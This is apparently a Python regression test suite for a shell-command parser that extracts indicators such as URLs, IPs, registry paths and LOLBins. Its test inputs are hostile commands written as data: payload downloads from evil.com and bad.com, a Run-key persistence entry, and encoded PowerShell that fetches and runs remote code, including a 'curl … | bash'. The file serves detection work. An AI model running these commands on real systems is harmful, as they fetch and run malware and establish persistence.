"""
validate_parser.py — regression test suite for parser.py
Run: python3 validate_parser.py
"""

import json
import sys
from parser import parse_command

PASS = "\033[32mPASS\033[0m"
FAIL = "\033[31mFAIL\033[0m"

TESTS = [
    # ── curl download ────────────────────────────────────────────────────────
    {
        "id": "curl_download",
        "command": "curl -o payload.exe http://1.2.3.4/payload.exe",
        "expect": {
            "executable": "curl",
            "platform": "linux",
            "urls": ["http://1.2.3.4/payload.exe"],
            "ips": ["1.2.3.4"],
            "file_paths": ["payload.exe"],
            "flags": ["-o"],
        },
    },
    # ── reg add with Windows paths ───────────────────────────────────────────
    {
        "id": "reg_add",
        "command": r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\evil.exe /f",
        "expect": {
            "executable": "reg",
            "platform": "windows",
            "subcommand": "add",
            "registry_paths": [r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"],
            "file_paths": [r"C:\Users\Public\evil.exe"],
        },
        "forbid": {
            "file_paths": ["/v", "/t", "/d", "/f"],
        },
    },
    # ── ssh remote target ────────────────────────────────────────────────────
    {
        "id": "ssh_remote",
        "command": "ssh user@192.168.1.10",
        "expect": {
            "executable": "ssh",
            "platform": "linux",
            "remote_targets": ["user@192.168.1.10"],
            "ips": ["192.168.1.10"],
        },
    },
    # ── powershell encoded command ────────────────────────────────────────────
    {
        "id": "powershell_encoded",
        # payload is base64(utf16le("IEX(New-Object Net.WebClient).DownloadString('http://bad.com')"))
        "command": "powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AYwBvAG0AJwApAA==",
        "expect": {
            "executable": "powershell.exe",
            "platform": "windows",
            "inline_code": True,
            "encoded_markers": ["encoded_command_flag", "base64_blob"],
        },
    },
    # ── pipe detection ────────────────────────────────────────────────────────
    {
        "id": "pipe_detect",
        "command": "cat /etc/passwd | grep root",
        "expect": {
            "has_pipe": True,
            "pipe_operators": ["|"],
            "executable": "cat",
        },
    },
    # ── tar archive extract ───────────────────────────────────────────────────
    {
        "id": "tar_extract",
        "command": "tar -xzf archive.tar.gz",
        "expect": {
            "executable": "tar",
            "archive_indicators": ["archive_tool", "archive_extract", "compression_gzip", "archive_path"],
        },
    },
    # ── wget with port ────────────────────────────────────────────────────────
    {
        "id": "wget_port",
        "command": "wget http://evil.com:8080/drop.sh",
        "expect": {
            "executable": "wget",
            "urls": ["http://evil.com:8080/drop.sh"],
            "domains": ["evil.com"],
            "ports": ["8080"],
        },
        "forbid": {
            "file_paths": ["/drop.sh"],
        },
    },
    # ── lolbin detection ──────────────────────────────────────────────────────
    {
        "id": "certutil_lolbin",
        "command": "certutil -urlcache -split -f http://bad.com/a.exe a.exe",
        "expect": {
            "executable": "certutil",
            "platform": "windows",
            "lolbin_matches": ["certutil"],
            "urls": ["http://bad.com/a.exe"],
        },
    },
    # ── chain operator ────────────────────────────────────────────────────────
    {
        "id": "chain_operator",
        "command": "mkdir /tmp/work && cd /tmp/work",
        "expect": {
            "has_chain": True,
            "chain_operators": ["&&"],
        },
    },
    # ── no false-positive domains from filenames ──────────────────────────────
    {
        "id": "no_domain_from_exe",
        "command": "curl -o payload.exe http://1.2.3.4/payload.exe",
        "forbid": {
            "domains": ["payload.exe"],
        },
    },
    # ── deobfuscation: bare base64 blob ───────────────────────────────────────
    # payload is base64(utf16le("curl http://evil.com/shell.sh | bash"))
    {
        "id": "deobfuscate_base64",
        "command": "powershell -EncodedCommand YwB1AHIAbAAgAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsAC4AcwBoACAAfAAgAGIAYQBzAGgA",
        "expect": {
            "urls": ["http://evil.com/shell.sh"],
            "domains": ["evil.com"],
            "has_pipe": True,
        },
        "not_none": ["deobfuscated_command"],
    },
    # ── deobfuscation: [char] construction ───────────────────────────────────
    {
        "id": "deobfuscate_char_cast",
        "command": "powershell -c \"[char]99+[char]109+[char]100\"",
        "expect": {
            "executable": "powershell",
            "platform": "windows",
        },
        "not_none": ["deobfuscated_command"],
    },
]


def _check_field(result: dict, field: str, expected_value) -> tuple[bool, str]:
    actual = result.get(field)
    if isinstance(expected_value, list):
        missing = [v for v in expected_value if v not in actual]
        if missing:
            return False, f"  {field}: missing {missing} (got {actual})"
    elif isinstance(expected_value, bool):
        if actual != expected_value:
            return False, f"  {field}: expected {expected_value}, got {actual}"
    elif isinstance(expected_value, str):
        if actual != expected_value:
            return False, f"  {field}: expected {expected_value!r}, got {actual!r}"
    elif actual != expected_value:
        return False, f"  {field}: expected {expected_value!r}, got {actual!r}"
    return True, ""


def _check_forbid(result: dict, field: str, forbidden_values) -> tuple[bool, str]:
    actual = result.get(field, [])
    if isinstance(forbidden_values, list):
        found = [v for v in forbidden_values if v in actual]
        if found:
            return False, f"  {field}: forbidden values present {found} (got {actual})"
    return True, ""


def run_tests() -> int:
    failures = 0
    for test in TESTS:
        tid = test["id"]
        result = parse_command(test["command"])
        errors = []

        for field, expected_value in test.get("expect", {}).items():
            ok, msg = _check_field(result, field, expected_value)
            if not ok:
                errors.append(msg)

        for field, forbidden_values in test.get("forbid", {}).items():
            ok, msg = _check_forbid(result, field, forbidden_values)
            if not ok:
                errors.append(msg)

        for field in test.get("not_none", []):
            if result.get(field) is None:
                errors.append(f"  {field}: expected non-None, got None")

        if errors:
            print(f"{FAIL}  [{tid}]")
            for e in errors:
                print(e)
            failures += 1
        else:
            print(f"{PASS}  [{tid}]")

    print()
    total = len(TESTS)
    passed = total - failures
    print(f"Results: {passed}/{total} passed")
    return failures


if __name__ == "__main__":
    sys.exit(run_tests())
